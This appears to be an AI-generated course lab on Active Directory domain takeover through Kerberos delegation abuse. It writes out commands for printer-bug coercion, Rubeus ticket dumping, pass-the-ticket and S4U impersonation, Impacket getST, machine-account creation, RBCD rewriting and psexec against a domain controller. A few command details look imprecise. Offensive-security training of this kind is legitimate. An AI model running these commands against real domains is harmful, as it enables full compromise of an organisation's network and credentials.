### _Week 10 — Active Directory (AD) Exploitation & Domain Takeover_

**Estimated Time:** 180–240 minutes  
**Difficulty:** Expert  
**Tools:** Rubeus, Mimikatz, Impacket (getST, getTGT), PowerView, BloodHound, Meterpreter, proxychains, domain‑joined Windows host

---

## **1. Purpose of This Lab**

This lab teaches you how to exploit **Kerberos delegation misconfigurations**, one of the most powerful and stealthy AD attack surfaces.

You will learn to exploit:

- **Unconstrained Delegation**
- **Constrained Delegation (S4U2Self / S4U2Proxy)**
- **Resource‑Based Constrained Delegation (RBCD)**

By the end of this lab, you will be able to:

- Identify delegation misconfigurations in BloodHound
- Abuse unconstrained delegation to impersonate Domain Admins
- Abuse constrained delegation to impersonate _any_ user for specific services
- Abuse RBCD to impersonate _any_ user for _any_ service
- Forge tickets using Rubeus and Impacket
- Achieve full domain compromise through delegation abuse

This is one of the most important AD exploitation labs.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 10.1 (AD Enumeration)**
- Completed **Lab 10.2 (Roasting)**
- Completed **Lab 10.3 (DCSync & Golden Tickets)**
- A foothold on a domain‑joined Windows host
- Rubeus uploaded
- Impacket installed
- BloodHound data imported
- SOCKS proxy + proxychains configured

Example topology:

```
Kali → Pivot → Domain Host → Domain Controller
```

---

## **3. Lab Tasks**

---

# **SECTION A — ENUMERATION OF DELEGATION**

---

# **Task 1 — Identify Delegation Objects in BloodHound**

### **Objective**

Find all delegation configurations.

### **Steps**

In BloodHound, run:

- **“Find Principals with Unconstrained Delegation”**
- **“Find Principals with Constrained Delegation”**
- **“Find Principals with Resource‑Based Constrained Delegation”**

### **What to Observe**

- Computers with unconstrained delegation
- Service accounts with constrained delegation
- Objects with msDS‑AllowedToActOnBehalfOfOtherIdentity (RBCD)

### **Deliverable**

A list of delegation objects.

---

# **Task 2 — Validate Delegation with PowerView**

### **Objective**

Confirm delegation settings manually.

### **Steps**

Load PowerView:

```
. .\PowerView.ps1
```

Check unconstrained delegation:

```
Get-DomainComputer -Unconstrained
```

Check constrained delegation:

```
Get-DomainUser -TrustedToAuth
```

Check RBCD:

```
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```

### **Deliverable**

A list of delegation configurations confirmed manually.

---

---

# **SECTION B — UNCONSTRAINED DELEGATION**

---

# **Task 3 — Abuse Unconstrained Delegation (Printer Bug)**

### **Objective**

Force a privileged account to authenticate to a machine with unconstrained delegation.

### **Steps**

Use SpoolService attack (Printer Bug):

```
SpoolSample.exe <target> <unconstrained-host>
```

### **What to Observe**

- The unconstrained delegation host receives a TGT for the privileged user
- Rubeus can extract the ticket

### **Deliverable**

A captured TGT for a privileged user.

---

# **Task 4 — Extract Tickets from Unconstrained Delegation Host**

### **Objective**

Dump cached TGTs.

### **Steps**

On the unconstrained host:

```
Rubeus.exe dump /nowrap
```

### **What to Observe**

- TGTs for Domain Admins
- TGTs for machine accounts
- Tickets usable for full domain compromise

### **Deliverable**

A list of extracted TGTs.

---

# **Task 5 — Use Extracted TGT to Access the Domain Controller**

### **Objective**

Inject the TGT and impersonate the privileged user.

### **Steps**

```
Rubeus.exe ptt /ticket:<kirbi>
```

Then:

```
dir \\<DC>\c$
```

### **Deliverable**

A note confirming domain access using unconstrained delegation.

---

---

# **SECTION C — CONSTRAINED DELEGATION (S4U2Self / S4U2Proxy)**

---

# **Task 6 — Identify Constrained Delegation Targets**

### **Objective**

Find accounts with `msDS-AllowedToDelegateTo`.

### **Steps**

PowerView:

```
Get-DomainUser -TrustedToAuth
```

Or BloodHound:

- **“Find Principals with Constrained Delegation”**

### **Deliverable**

A list of constrained delegation accounts.

---

# **Task 7 — Abuse Constrained Delegation with Rubeus**

### **Objective**

Impersonate _any_ user for the delegated service.

### **Steps**

Request a TGT for yourself:

```
Rubeus.exe tgtdeleg
```

Use S4U2Self to impersonate a user:

```
Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:cifs/DC.domain.local
```

### **What to Observe**

- You receive a service ticket for Administrator
- You can access the service as Administrator

### **Deliverable**

A forged S4U2Proxy ticket.

---

# **Task 8 — Abuse Constrained Delegation with Impacket**

### **Objective**

Perform the same attack from Kali.

### **Steps**

```
proxychains python3 getST.py -spn cifs/DC.domain.local <domain>/<svc_user>:<pass>
```

### **Deliverable**

A service ticket for a privileged user.

---

---

# **SECTION D — RESOURCE‑BASED CONSTRAINED DELEGATION (RBCD)**

---

# **Task 9 — Identify RBCD Objects**

### **Objective**

Find objects with `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### **Steps**

PowerView:

```
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```

### **Deliverable**

A list of RBCD‑enabled objects.

---

# **Task 10 — Create a Fake Computer Account (If Allowed)**

### **Objective**

Add a machine account you control.

### **Steps**

```
python3 addcomputer.py <domain>/<user>:<pass>
```

### **Deliverable**

A new machine account you control.

---

# **Task 11 — Configure RBCD to Allow Your Machine to Act for Another**

### **Objective**

Modify the target object’s RBCD ACL.

### **Steps**

```
python3 rbcd.py -delegate-from <fake-machine> -delegate-to <target-machine>
```

### **Deliverable**

RBCD configured for your fake machine.

---

# **Task 12 — Forge a Ticket Using RBCD**

### **Objective**

Impersonate _any_ user for _any_ service.

### **Steps**

```
proxychains python3 getST.py -spn cifs/DC.domain.local -impersonate Administrator <domain>/<fake-machine>$:<password>
```

### **Deliverable**

A forged ticket granting domain‑level access.

---

---

# **Task 13 — Validate Domain Dominance via Delegation Abuse**

### **Objective**

Confirm full domain compromise.

### **Steps**

Try:

```
dir \\<DC>\c$
```

Or:

```
psexec \\<DC> cmd
```

### **Deliverable**

A note confirming domain dominance.

---

# **Task 14 — Build a Delegation Abuse Attack Chain**

### **Objective**

Document your entire delegation exploitation path.

### **Include:**

- Unconstrained delegation abuse
- Constrained delegation abuse
- RBCD abuse
- Tickets forged
- Privileged access obtained
- Domain dominance validated

### **Deliverable**

A complete delegation abuse chain in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 10.4 when you can:

- Identify all delegation types in AD
- Abuse unconstrained delegation
- Abuse constrained delegation (S4U2Self/S4U2Proxy)
- Abuse RBCD to impersonate any user
- Forge tickets using Rubeus and Impacket
- Achieve full domain compromise
- Document a complete delegation exploitation chain

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 10.5 — Certificate Services Exploitation (ESC1–ESC8)** in the same course style.